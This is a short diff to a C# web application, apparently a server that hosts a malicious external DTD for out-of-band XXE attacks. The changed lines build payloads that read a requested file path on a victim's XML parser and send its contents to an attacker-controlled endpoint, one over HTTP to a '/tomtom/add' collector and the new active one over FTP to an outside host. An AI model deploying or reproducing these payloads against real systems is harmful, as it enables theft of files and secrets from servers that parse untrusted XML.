@@ -60,7 +60,8 @@ namespace DuosWeb
                     Info = "RESOURCE ACCESSED WITH PATH = " + path + "<br>" + getRaw()
                 });
                 //return Response.AsText("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"" + path + "\"><!ENTITY % all \"<!ENTITY send SYSTEM 'http://duos.apphb.com/tomtom/add?text=%file;'>\">%all;");
-                return Response.AsText("<!ENTITY % payload SYSTEM \"" + path + "\"><!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://duos.apphb.com/tomtom/add?text=%payload;'>\"> %int; %trick;");
+                return Response.AsText("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!ENTITY % file SYSTEM \"" + path + "\"><!ENTITY % all \"<!ENTITY send SYSTEM 'ftp://demo:password@test.rebex.net/text=%file;'>\">%all;");
+                //return Response.AsText("<!ENTITY % payload SYSTEM \"" + path + "\"><!ENTITY % int \"<!ENTITY &#37; trick SYSTEM 'http://duos.apphb.com/tomtom/add?text=%payload;'>\"> %int; %trick;");
             };
 
             Get["/tomtom/{any*}"] = _ =>
